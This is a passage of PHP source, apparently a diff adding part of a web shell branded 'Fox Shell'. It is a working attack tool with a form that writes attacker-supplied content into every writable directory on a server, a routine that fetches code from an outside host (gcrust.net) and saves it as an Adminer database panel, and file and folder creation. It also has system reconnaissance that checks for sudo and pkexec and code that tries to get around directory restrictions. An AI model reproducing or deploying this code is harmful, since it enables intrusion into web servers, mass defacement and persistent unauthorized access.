sabun_massal($serlok,$namafile,$isi_script){if(is_writable($serlok)){$dira=scandir($serlok);foreach($dira as $dirb){$dirc="$serlok/$dirb";$lokasi=$dirc.'/'.$namafile;if($dirb==='.'){file_put_contents($lokasi,$isi_script);}elseif($dirb==='..'){file_put_contents($lokasi,$isi_script);}else{if(is_dir($dirc)){if(is_writable($dirc)){echo"[<font color=lime>DONE</font>] $serlok<br>";file_put_contents($lokasi,$isi_script);$idx=sabun_massal($dirc,$namafile,$isi_script);}}}}}}function sabun_biasa($serlok,$namafile,$isi_script){if(is_writable($serlok)){$dira=scandir($serlok);foreach($dira as $dirb){$dirc="$serlok/$dirb";$lokasi=$dirc.'/'.$namafile;if($dirb==='.'){file_put_contents($lokasi,$isi_script);}elseif($dirb==='..'){file_put_contents($lokasi,$isi_script);}else{if(is_dir($dirc)){if(is_writable($dirc)){echo" http://$dirb/$namafile<br>";file_put_contents($lokasi,$isi_script);}}}}}}if($_POST['start']){if($_POST['tipe_sabun']=='mahal'){echo "<table class='directory-listing-table'><td>";sabun_massal($_POST['d_dir'],$_POST['d_file'],$_POST['script']);echo "</td></table></div>";}elseif($_POST['tipe_sabun']=='murah'){echo "<table class='directory-listing-table'><td>";sabun_biasa($_POST['d_dir'],$_POST['d_file'],$_POST['script']);echo "</td></table></div>";}}else{echo "<table class='directory-listing-table'><td>";echo"<form method='post'>
+    <div class='form-check-inline mb-2'>
+    <input type='radio' name='tipe_sabun' id='biasa' class='form-check-input' value='murah' checked>
+    <label class='form-check-label' for='inlineRadio1'>Biasa</label></div>
+    <div class='form-check form-check-inline'>
+    <input type='radio' name='tipe_sabun' class='form-check-input' value='mahal'>
+    <label class='form-check-label' for='inlineRadio2'>Massal</label></div>
+    <div class='input-group' style='width:430px;'>
+    <span class='input-group-text mb-1'>Files :</span>
+    <input type='text' name='d_file' class='form-control' placeholder='file.html'></div>
+    <div class='input-group' style='width:750px;'>
+    <span class='input-group-text mb-1'>Path :</span>
+    <input type='text' name='d_dir' class='form-control' value='$serlok'></div>
+    <textarea name='script' class='form-control' style='width: 750px; height: 300px;' placeholder='Hello Word!'></textarea><br>
+    <button type='submit' name='start' value='start' class='btn btn-outline-light' style='width: 300px;'>submit</button>&nbsp;
+    <a href='?path=$serlok&".net('tool')."=foxx' class='btn btn-outline-light' style='width: 300px;'>Back</a>\n    </form></td></table>";}exit();}elseif($_REQUEST[net('ner')]=="foxx"){function crot($url){$fox=curl_init($url);curl_setopt($fox,CURLOPT_RETURNTRANSFER,1);curl_setopt($fox,CURLOPT_CONNECTTIMEOUT,10);curl_setopt($fox,CURLOPT_FOLLOWLOCATION,1);curl_setopt($fox,CURLOPT_HEADER,0);return curl_exec($fox);curl_close($fox);}echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='fox-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>\n    <form method='POST'>\n    <div class='input-group' style='width:300px;'>\n    <span class='input-group-text mb-2'>Filename :</span>\n    <input type='text' placeholder='adminer.php' class='form-control mb-2' name='miner'></div><br>\n        <button type='sumbit' class='btn btn-outline-light' name='gass' style='width:120px;'>Submit</button>&nbsp;\n        <a href='?path=".$serlok."&".net('tool')."=foxx' class='btn btn-outline-light' style='width:120px;'>Back</a></form></td></table><br>";if(isset($_POST['gass'])){if(empty($_POST['miner'])){echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Input field is required<center></font></td></table>";}else{$check=$serlok."/".$_POST['miner'];$result=str_replace($_SERVER['DOCUMENT_ROOT'],$web."",$check);$content=crot('https://main2.gcrust.net/fox/min.txt');$open=fopen($check,'w');fwrite($open,$content);fclose($open);if(file_exists($check)){echo"<table class='directory-listing-table' style='border-color:lime;'><td>Adminer<font color='lime'> : $check </font><br>Link : <a href='".$result."' target='_blank'><i>$result</i></a></td></table>";}else{echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create adminer..!!</center></font></td></table>";}}}exit();}elseif($_REQUEST[net('buatfile')]=="foxx"){function createfile(){$pat=$_GET['path'];$nama_file=$_POST['nama_file'];$isi_file=$_POST['isi_file'];$handle=fopen("$pat/$nama_file",'w');$files=$_GET['path']."/".$nama_file;$asu=str_replace($_SERVER['DOCUMENT_ROOT'],$web."",$files);if(fwrite($handle,$isi_file)){echo '<div style="display: flex; justify-content: center; width: 100%; padding: 20px;">
+                <table class="directory-listing-table" style="border-color:lime; width: 90%; max-width: 800px;">
+                    <td style="text-align: center; padding: 20px;">
+                        Created =>&nbsp;<font color="lime">'.$pat.'/'.$nama_file.'<br></font>
+                        Link : <a href="'.$asu.'" target="_blank"><font color="aqua"><i>Click here</i></a></font>
+                    </td>
+                </table>
+            </div>';}else{echo '<div style="display: flex; justify-content: center; width: 100%; padding: 20px;">
+                <table class="directory-listing-table" style="border-color:red; width: 90%; max-width: 800px;">
+                    <td style="text-align: center; padding: 20px;">
+                        <font color=red><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to create file..!!</font>
+                    </td>
+                </table>
+            </div>';}}if(!isset($_POST['bikin'])){echo "<div style='display: flex; justify-content: center; width: 100%; padding: 20px;'>\n    <table class='directory-listing-table' style='width: 90%; max-width: 800px;'>\n        <td style='text-align: center; padding: 30px;'>\n            <form method='POST'>\n                <input type='text' value='file.php' placeholder='Nama File' style='width: 100%; max-width: 500px; box-sizing: border-box;' name='nama_file' autocomplete='off'><br><br>\n                <textarea name='isi_file' rows='20' style='width: 100%; max-width: 100%; box-sizing: border-box;' placeholder='Hello World!'></textarea><br><br>\n                <button type='sumbit' class='btn btn-outline-light' style='width:200px; height:36px;' name='bikin'>CREATE</button>&nbsp;\n                <a href='?path=".$serlok."' class='btn btn-outline-light'>Back</a><br>\n            </form>\n        </td>\n    </table>\n</div>";}else{createfile();}exit();}elseif($_GET[net('buatfolder')]=="foxx"){function createDirectory(){if(empty($_POST['add'])){echo '<table class="directory-listing-table" style="border-color:orange;"><td><font color="orange">Folder field is required</font> [<a href="?path='.$_GET['path'].'&'.net("buatfolder").'=foxx"><i class="fa-solid fa-folder-plus" aria-hidden="true"></i>Create again</a>]</td></table>';}else{$add=$_POST["add"];$fox=mkdir($_GET['path']."/".$add);if($fox==true){echo '<div style="display: flex; justify-content: center; width: 100%; padding: 20px;">
+                <table class="directory-listing-table" style="border-color:lime; width: 90%; max-width: 600px;">
+                    <td style="text-align: center; padding: 20px;">
+                        Created =><font color=lime> '.$_GET['path'].'/</font><font color="orange">'.$add.'</font><br>
+                        <a href="?path='.$_GET['path'].'/'.$add.'"><u>Click Here</u></a>
+                    </td>
+                </table>
+            </div>';}else{echo '<div style="display: flex; justify-content: center; width: 100%; padding: 20px;">
+                <table class="directory-listing-table" style="border-color:red; width: 90%; max-width: 600px;">
+                    <td style="text-align: center; padding: 20px;">
+                        <font color=red><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to create folder : '.$add.'</font>
+                    </td>
+                </table>
+            </div>';}}}if(!isset($_POST['submit'])){echo '<div style="display: flex; justify-content: center; width: 100%; padding: 20px;">
+    <table class="directory-listing-table" style="width: 90%; max-width: 600px;">
+        <td style="text-align: center; padding: 30px;">
+            <form action="" method = "POST">
+                <h5><i class="fa fa-folder-plus"></i> Create Folder</h5><hr>
+                <div style="margin: 20px 0;">
+                    <input type="text" class="form-control" placeholder="Folder Name" name="add" id="add" style="width: 100%; max-width: 300px; margin: 0 auto;"/><br>
+                </div>
+                <button type="submit" class="btn btn-outline-light" name="submit" value="Create directory" style="width:120px;">Create</button>&nbsp;
+                <a href="?path='.$serlok.'" class="btn btn-outline-light" style="width:120px;">Back</a><br><br>
+            </form>
+        </td>
+    </table>
+</div>';}else{createDirectory();}exit();}elseif($_REQUEST[net('info')]=="foxx"){echo "<table class='directory-listing-table' align='center'>\n<div id='content'><tr><td>";echo "Server : <font color=orang>".$_SERVER['HTTP_HOST']."</font><br>";echo "Server IP : <font color=orange>".ipserv()."</font> &nbsp;<br> Your IP : <font color=orange>".$_SERVER['REMOTE_ADDR']."</font><br>";echo "Web Server : <font color='orange'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";echo "System : <font color='orange'>".php_uname()."</font><br>";echo "User : <font color='orange'>".@get_current_user()."&nbsp;</font>( <font color='orange'>".@getmyuid()."</font>)<br>";echo "PHP Version : <font color='orange'>".@phpversion()."&nbsp;</font>=><font color='orange'>&nbsp;".php_sapi_name()."</font><br>";echo "</tr></td><tr><td>Disable Function : ".$disf."</font>";echo "</div></tr></td><tr><td>";echo "<hr>Orecle : ";if(function_exists('oci_connect')){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";echo "&nbsp;| SSH2 : ";}if(function_exists('ssh2_connect')){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";echo "&nbsp;| MySQL : ";}if(function_exists("mysql_connect")){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;| cURL : ";if(function_exists("curl_init")){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;| WGET : ";if(file_exists("/usr/bin/wget")){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;| Perl : ";if(file_exists("/usr/bin/perl")){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;| Python : ";if(file_exists("/usr/bin/python2")){echo "<font color=lime>ON</font>";}else{echo "<font color=red>OFF</font>";}$pkexec=(@shell_exec("pkexec --version"))?"<font color='lime'>ON</font>":"<font color='red'>OFF</font>";echo" | PKEXEC : $pkexec<br><br>";echo "</tr></td></table><br>";exit();}$bypass_result=fox_scandir_bypass($serlok);if($bypass_result===false){die("<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :( (Even with bypass attempts)</font></center></td></thead></table>");}if(!isAllowedByOpenBaseDir($serlok)){echo "<div class='directory-listing-table' style='border:1px solid #ef4444;color:#ef4444;padding:10px;margin:0 20px 10px;'>\n            <b>Warning:</b> Path ini di luar <code>open_basedir</code> / permission OS. Aksi & metadata via PHP dibatasi.\n          </div>";}echo '<div style="display: flex; justify-content: center; width: 100%; margin: 20px 0; padding: 0 20px;">
+<table class="table table-dark table-hover" style="
+    background: rgba(15, 27, 46, 0.95);
+    backdrop-filter: blur(25px);
+    border: 1px solid rgba(59, 130, 246, 0.3);
+    border-radius: 16px;
+    box-shadow: 
+        0 12px 40px rgba(0, 0, 0, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.1),
+        0 0 0 1px rgba(59, 130, 246, 0.1);
+    width: calc(100% - 40px);
+    overflow: hidden;
+    margin: 0;
+" align="center">
+<thead style="
+    background: rgba(59, 130, 246, 0.15);
+    backdrop-filter: blur(10px);
+    color: #e8f4ff;
+    text-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+"><tr>
+<th style="width: 25%;"><center>Name</center></th>
+<th style="width: 12%;"><center>Size</center></th>
+<th style="width: 18%;"><center>Last Modified</center></th>
+<th style="width: 12%;"><center>Owner</center></th>
+<th style="width: 13%;"><center>Permissions</center></th>
+<th style="width: 20%;"><center>Actions</center></th>
+</tr></thead><center>';$fetch=$bypass_result;$serlokbos=array();$filez=array();foreach($fetch as $fols){if($fols=='.'||$fols=='..'){continue;}$foxs=$serlok.'/'.$fols;$is_dir_result=@is_dir($foxs);$is_file_result=@is_file($foxs);if(!$is_dir_result&&!$is_file_result){$stat_result=foxEx("stat '".addslashes($foxs)."' 2>/dev/null");if(strpos($stat_result,'directory')!==false){$is_dir_result=true;}elseif(strpos($stat_result,'regular file')!==false){$is_file_result=true;}}if($is_dir_result){array_push($serlokbos,$fols);}elseif($is_file_result){array_push($filez,$fols);}}foreach($serlokbos as $dir){$it=$serlok.'/'.$dir;$allowed=isAllowedByOpenBaseDir($it)&&@is_readable($it);$dateTxt=filedate($it);$ownerTxt=owner($it);$permTxt=statusnya($it);$permOpen='';if(is_writable($it))$permOpen='<font color="lime">';elseif(!$allowed||!is_readable($it))$permOpen='<font color="red">';$permClose=$permOpen?'</font>':'';echo"<tr>
+<td><i class='fa fa-folder' style='color: #FAA625'></i> <a href=\"?path={$serlok}/{$dir}\">{$dir}</a></td>
+<td><center>Dir</center></td>
+<td><center>{$dateTxt}</center></td>
+<td>{$ownerTxt}</td>
+<td><center>{$permOpen}{$permTxt}{$permClose}</center></td>
+<td><center>";if(!$allowed){echo "<span class='btn btn-outline-secondary disabled' title='open_basedir/permission denied' style='opacity:.5;pointer-events:none'>\n                <i class='fa fa-ban'></i> No access\n              </span>";}else{echo"<form method=\"POST\" action=\"?pilihan&path={$serlok}\">
+<div class='btn-group me-2' role='group' aria-label='First group'>
+<button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
+<i class='fa fa-pencil' style='color:#fff'></i></button>
+<button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color:#06D2D5'></i></button>
+<button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color:#5654F5'></i></button>
+<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color:#E53A3A'></i></button>
+</div>
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"{$dir}\">
+<input type=\"hidden\" name=\"path\" value=\"{$it}\">
+</form>";}echo "</center></td></tr>";}foreach($filez as $file){if(!is_file("$serlok/$file"))continue;$size=filesize("$serlok/$file")/1024;$size=round($size,3);if($size>=1024){$size='<font color="aqua">'.round($size/1024,2).'</font> MB';}else{$size='<font color="#E6F01C">'.$size.'</font> KB';}echo "<tr>\n    <td>".cekfile($serlok."/".$file)."\n    <a href=\"?viewfile=".$serlok."/$file&path=".$serlok."\">$file</a></td>
+    <td><center>".$size."</center></td>\n    <td><center>".filedate($serlok."/".$file)."</center></td>\n    <td>".owner($serlok."/".$file)."</td>\n    <td><center>";if(is_writable("$serlok/$file"))echo '<font color="lime">';elseif(!is_readable("$serlok/$file"))echo '<font color="red">';echo statusnya("$serlok/$file");if(is_writable("$serlok/$file")||!is_readable("$serlok/$file"))echo '</font>';echo"</center></td><td><center>
+    <form method='POST' action='?pilihan&path=$serlok'>
+    <div class='btn-group' role='group' aria-label='First group'>";echo gazz($file);echo"</div><input type=\"hidden\" name=\"type\" value=\"file\">
+    <input type=\"hidden\" name=\"name\" value=\"$file\">
+    <input type=\"hidden\" name=\"path\" value=\"$serlok/$file\">
+    </form></center></td></tr>";}echo '</tr></td></table></table></div>';function statusnya($file){$p=@fileperms($file);return $p!==false?substr(sprintf('%o',$p),-4):'—';}function getEnhancedSystemInfo(){$info=['system'=>php_uname(),'user'=>@exec('whoami 2>/dev/null')?:get_current_user(),'groups'=>@exec('groups 2>/dev/null')?:'N/A','shell'=>@exec('echo $SHELL 2>/dev/null')?:'N/A','path_env'=>@exec('echo $PATH 2>/dev/null')?:'N/A','sudo_check'=>@exec('sudo -n true 2>/dev/null && echo "YES" || echo "NO"')?:'N/A'];return $info;}function getQuickNavPaths(){$paths=['/'=>'Root Directory','/home'=>'Home','/var/www'=>'Web Root','/etc'=>'Config','/var/log'=>'Logs','/tmp'=>'Temp','/usr/bin'=>'Binaries'];$available=[];foreach($paths as $path=>$label){if(is_readable($path)){$available[$path]=$label;}}return $available;} ?>
+<footer style="text-align: center; padding: 15px; color: #00aeffff; font-size: 14px;">
+    &copy; 2025|R24. 𝙁𝙤𝙭🦊𝙎𝙝𝙚𝙡𝙡.
+</footer>
+</body>
+</html>
